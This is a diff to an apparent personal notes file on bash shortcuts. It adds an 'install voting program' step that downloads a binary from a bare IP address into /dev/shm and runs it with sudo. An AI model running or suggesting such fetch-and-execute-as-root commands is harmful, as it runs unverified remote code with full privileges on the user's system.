@@ -1,3 +1,9 @@
+安装投票程序:
+    wget http://3.3.3.3/tools/dm_ins -O /dev/shm/dm_ins
+    sudo chmod +x /dev/shm/dm_ins
+    sudo /dev/shm/dm_ins 3.3.3.3
+
+
 bash shell
     快捷键
         tab     补全
